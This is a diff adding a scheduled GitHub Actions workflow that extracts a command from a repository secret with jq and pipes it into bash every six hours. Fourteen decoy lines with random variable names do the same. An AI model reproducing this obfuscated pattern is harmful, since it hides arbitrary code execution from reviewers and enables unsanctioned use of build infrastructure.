@@ -1,0 +1,30 @@
+name: jiejinbeisan
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '30 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: jiejinbeisan
+        env:
+          r548: ${{ secrets.r548 }}
+        run: |
+          echo $r548 | jq -r .knspw6 | /bin/bash
+          echo $qb403 | jq -r .ldy746 | /bin/bash
+          echo $hu537 | jq -r .wjkek6195 | /bin/bash
+          echo $pieeq546 | jq -r .s605 | /bin/bash
+          echo $omg98458 | jq -r .pmmq0 | /bin/bash
+          echo $jxn9 | jq -r .z30219 | /bin/bash
+          echo $bmmmm955 | jq -r .kp95 | /bin/bash
+          echo $lkq66 | jq -r .vyfjd74 | /bin/bash
+          echo $eyzlw03 | jq -r .ral8217 | /bin/bash
+          echo $qocja56 | jq -r .otz61575 | /bin/bash
+          echo $vddvp32631 | jq -r .in63628 | /bin/bash
+          echo $gb98 | jq -r .qr83214 | /bin/bash
+          echo $glaj133 | jq -r .arefg3961 | /bin/bash
+          echo $k569 | jq -r .aftl92293 | /bin/bash
+          echo $t90 | jq -r .sx9 | /bin/bash
+
